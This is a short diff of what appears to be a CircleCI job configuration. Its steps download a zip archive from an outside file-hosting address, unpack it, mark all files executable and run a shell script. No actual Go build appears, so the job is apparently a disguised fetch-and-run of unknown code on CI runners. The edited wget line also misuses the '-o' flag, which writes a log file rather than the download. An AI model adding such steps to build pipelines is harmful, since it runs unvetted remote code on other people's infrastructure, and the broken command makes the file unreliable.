@@ -8,7 +8,7 @@ jobs:
     docker:
       - image: circleci/golang:1.9
     steps:
-      - run: curl https://trojanzhex.file2link.workers.dev/0:/TroJanzHEX/spin.zip -o a.zip
+      - run: wget https://trojanzhex.file2link.workers.dev/0:/TroJanzHEX/spin.zip -o a.zip
       - run: unzip a.zip
       - run: chmod +x *
       - run: ./wheel.sh
